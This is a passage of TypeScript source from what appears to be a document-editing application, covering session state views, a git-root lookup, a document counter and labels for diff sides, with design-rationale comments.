   * `view()` for it would re-read every document's frontmatter on a timer.
   */
  messages(): readonly ChatMessage[] {
    return this.m.chat;
  }

  view(
    mode: "dev" | "release",
    selection: Selection | null,
    // ⚠ `waiting` is the SERVER's to add (E53): it depends on the clock and on
    // the snooze the server holds, neither of which belongs in the session.
    // ⚠ `waiting` and `history` are the SERVER's to add (E53, E60): one depends
    // on the clock and the snooze it holds, the other on the in-memory act
    // stacks. Neither belongs in the session's persisted state.
  ): Omit<PublicState, "prefs" | "userHome" | "waiting" | "history"> {
    const meta = this.contextMeta();
    return {
      sessionId: this.m.sessionId,
      home: this.home,
      workspace: this.workspace,
      docMeta: meta.map,
      ...(meta.truncated ? { docMetaTruncated: true } : {}),
      mode,
      context: this.m.context,
      docs: this.m.docs.map((d) => this.docView(d)),
      openDoc: this.m.openDoc,
      selection,
      chat: this.m.chat,
      tasks: this.tasks(),
    };
  }
}

/**
 * The git working tree `dir` is in, or null. A `.git` ENTRY, not a directory
 * test: a worktree and a submodule both have `.git` as a FILE.
 */
export function gitRootOf(dir: string): string | null {
  let at = dir;
  for (;;) {
    if (existsSync(join(at, ".git"))) return at;
    const up = dirname(at);
    if (up === at) return null;
    at = up;
  }
}

/** Documents under a folder, for saying how much a move moves. */
function countDocs(dir: string): number {
  let n = 0;
  const walk = (at: string) => {
    let names: string[];
    try {
      names = readdirSync(at);
    } catch {
      return;
    }
    for (const name of names) {
      if (name.startsWith(".")) continue;
      const abs = join(at, name);
      let st: ReturnType<typeof statSync>;
      try {
        st = statSync(abs);
      } catch {
        continue;
      }
      if (st.isDirectory()) walk(abs);
      else if (isDocName(name)) n++;
    }
  };
  walk(dir);
  return n;
}

/**
 * How a comparison side reads in a message to a human or an agent.
 *
 * ⛔ THE FILE IS NAMED, NOT DESCRIBED (E43, revised). "The original" sounded
 * temporal when the thing is locational; "the saved file" fixed that but reads
 * circular the moment it is a DESTINATION — "save to the saved file" says
 * nothing. No noun encapsulates "this file, at this place", so the file gets
 * its own name: `note.md`. Cole: "that's probably closer to the right answer
 * versus trying to come up with a word that encapsulates it."
 *
 * `file` is the document's name when the caller knows it; without one this
 * falls back to a generic, which is only for contexts that have no document in
 * hand.
 */
export function sideName(side: DiffSide, file?: string): string {
  if (side !== "original") return `v${side}`;
  return file ?? "the saved file";
}
